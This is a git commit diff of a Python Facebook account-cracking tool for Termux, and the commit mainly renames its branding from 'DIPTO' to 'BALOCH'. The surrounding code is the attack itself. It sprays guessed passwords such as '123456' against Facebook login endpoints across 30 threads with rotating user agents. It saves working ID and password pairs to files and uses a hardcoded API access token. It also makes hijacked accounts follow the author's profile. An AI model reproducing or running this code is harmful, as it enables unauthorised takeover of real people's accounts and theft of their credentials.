2e8f496c4aa8314dc0b0f8f8d894d90d59118d24
DIPTO103 <142988836+DIPTO103@users.noreply.github.com>
2023-08-24 08:27:21 +0600

    Add files via upload

--- Test.py
+++ Test.py
@@ -83,9 +83,9 @@ imt="-M4786=="
 ak="DIPTO-"
 myid=uuid.uuid4().hex[:10].upper()
 try:
-	key1 = open('/data/data/com.termux/files/usr/bin/.mrDIPTO -cov', 'r').read()
+	key1 = open('/data/data/com.termux/files/usr/bin/.mrBALOCH -cov', 'r').read()
 except:
-	kok=open('/data/data/com.termux/files/usr/bin/.mrDIPTO -cov', 'w')
+	kok=open('/data/data/com.termux/files/usr/bin/.mrBALOCH -cov', 'w')
 	kok.write(myid+imt)
 	kok.close()
 def login():
@@ -300,7 +300,7 @@ def crack(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[ DIPTO ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[ BALOCH ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -315,14 +315,14 @@ def crack(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				cp +=1
-				print( f'\r\x1b[1;91m [ DIPTO-CP ] {idf} | {pw}')
+				print( f'\r\x1b[1;91m [ BALOCH-CP ] {idf} | {pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [ DIPTO-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [ BALOCH-OK ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
 				open('/sdcard/ids/ok.txt','a').write('%s\n' % wrt)
@@ -353,17 +353,17 @@ def free(idf,pwv):
 			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
 			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				rint( f'\r\x1b[1;91m [ DIPTO-CP ] {idf} | {pw}')
+				rint( f'\r\x1b[1;91m [ BALOCH-CP ] {idf} | {pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [ DIPTO-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [ BALOCH-OK ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/DIPTO-OK.txt','a').write('%s\n' % wrt)
+				open('/sdcard/BALOCH-OK.txt','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
 
@@ -379,26 +379,27 @@ def follow(ses,coki):
 	ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
 
 logo = ("""\033[1;32m 
-\033[1;32m########  #### ########  ########  #######  
-\033[1;32m##     ##  ##  ##     ##    ##    ##     ## 
-\033[1;32m##     ##  ##  ##     ##    ##    ##     ## 
-\033[1;32m##     ##  ##  ########     ##    ##     ## 
-\033[1;32m##     ##  ##  ##           ##    ##     ## 
-\033[1;32m##     ##  ##  ##           ##    ##     ## 
-\033[1;32m########  #### ##           ##     #######  
+\033[1;32m  _____ _____ _____ _______ ____  
+\033[1;32m |  __ \_   _|  __ \__   __/ __ \ 
+\033[1;32m | |  | || | | |__) | | | | |  | |
+\033[1;32m | |  | || | |  ___/  | | | |  | |
+\033[1;32m | |__| || |_| |      | | | |__| |
+\033[1;32m |_____/_____|_|      |_|  \____/ 
+                                  
+                                  
                                               
 
 
 
-\033[;33mCLEAR FECBOOK DATA TO OEPN CP ID JUST NOW😽
+\033[;33mCLEAR FECBOOK DATA TO OEPN CP ID JUST NOW
 
         
  
 ••••••••••••••••••••••••••••••••••••••••••••••••••\033[1;33m
-  \033[1;32mAuther  :DIPTO TRICKER
-  \033[1;33mYouTube :DIPTO TRICKER
-  \033[1;32mFecbook :DIPTO TRICKER
-   \033[1;33m Admin. :DIPTO TRICKER
+  \033[1;32mAuther  :Dipto Sarkar 
+  \033[1;32mFecbook :Dipto Sarkar 
+   \033[1;32mGithub :DIPTO103
+   \033[1;33m Admin :Dipto Sarkar 
 ••••••••••••••••••••••••••••••••••••••••••••••••••\033[1;32m""")
 
 class Main:
@@ -410,9 +411,9 @@ class Main:
 		os.system("clear")
 		print(logo)
 		print("")
-		print("\033[1;36m     UNSUSCRIBE KARNE WALON KA APROVEL URA DEYA JAIGA")
+		print("\033[1;36m     MUST FOLLOW IN FACEBOOK ")
 		print("")
-		print("\033[1;32m [1] First You Subscribe Channel")
+		print("\033[1;32m [1] First You Follow Facebook")
 		print("\033[1;33m [2] Exit")
 		print("")
 		DIPTO = input("\n\033[1;36m  Chose ==> \033[1;32m")
@@ -422,10 +423,10 @@ class Main:
 			print("    Thanks🥰♥️")
 			exit()
 		elif DIPTO in ["1", "01"]:
-			os.system("xdg-open https://youtube.com/@cartoonkids2727")
+			os.system("xdg-open https://www.facebook.com/profile.php?id=100091484814365&mibextid=D4KYlr")
 			print("")
 			time.sleep(2.0)
-			print("\033[1;33m    Apna nam type kro")
+			print("\033[1;33m    Apnar nam type kro")
 			print("")
 			input("\n\033[1;32m  Type Name ==> \033[1;36m")
 			time.sleep(2.1)
@@ -479,8 +480,8 @@ class Main:
 				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
 				os.system("clear")
 				print(logo)
-				print("\n%s [+] OK RESULTS SAVED IN -> Dipto ok.txt"%(Y))
-				print("%s [+] CP RESULTS SAVED IN -> Dipto cp.txt"%(G))
+				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(Y))
+				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(G))
 				print("%s [!] IF NO RESULT USE AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(P))
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
@@ -853,7 +854,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [ DIPTO ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [ BALOCH ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -870,7 +871,7 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ DIPTO-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ BALOCH-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
 				open("2009-DIPTO -Ok.txt","a").write(" %s|%s\n"%(uid, pw))
@@ -899,15 +900,15 @@ class Main:
 			
 			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
 			with ThreadPoolExecutor(max_workers=30) as coeg:
-				print("\n\033[1;32m [!] USE (123456) FOR IDZ\033[1;37m ")
+				print("\n\033[1;32m [!] USE (123456,789101,753893,246810) FOR IDZ\033[1;37m ")
 				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
 				if len(listpass)<=5:
 					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
 				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
 				os.system("clear")
 				print(logo)
-				print("\n%s [+] OK RESULTS SAVED IN -> Dipto ok.txt"%(Y))
-				print("%s [+] CP RESULTS SAVED IN -> Dipto cp.txt"%(G))
+				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(Y))
+				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(G))
 				print("%s [!] IF NO RESULT USE AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(P))
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
@@ -1314,7 +1315,7 @@ class Main:
 
 
 def Subscraption():
-	key1=open('/data/data/com.termux/files/usr/bin/.mrDIPTO -cov', 'r').read()
+	key1=open('/data/data/com.termux/files/usr/bin/.mrBALOCH -cov', 'r').read()
 	clear()
 	print(logo)
 	r1=requests.get("https://github.com/DIPTO103/trick/blob/main/trick.txt").text
@@ -1330,8 +1331,8 @@ def Subscraption():
 		os.system("clear")
 		print(logo)
 		print ("")
-		print(" \033[1;32mYou Need Get Approved First\033[1;37m\n")
-		print(" \033[1;32m Note :Paid Tool ENJOYA   \033[1;37m")
+		print(" \033[1;32mThis Toll Paid But You Need Get Approved First\033[1;37m\n")
+		print(" \033[1;32m Note :THIS TOOL IS PAID YOU CAN BOY AND USE IT   \033[1;37m")
 		print ("")
 		print(" Your Key is Not Approved ")
 		print("")
@@ -1339,9 +1340,9 @@ def Subscraption():
 		print ("")
 		print (" Your Key : "+ak+ah+key1 )
 		print ("")
-		name = input(" Your Fast Name : ")
+		name = input(" Your Name : ")
 		print ("")
-		gf = input(" Your Last Name : ")
+		gf = input(" Your gf Name : ")
 		print ("")
 		lol = input(" Your Your Email : ")
 		print ("")
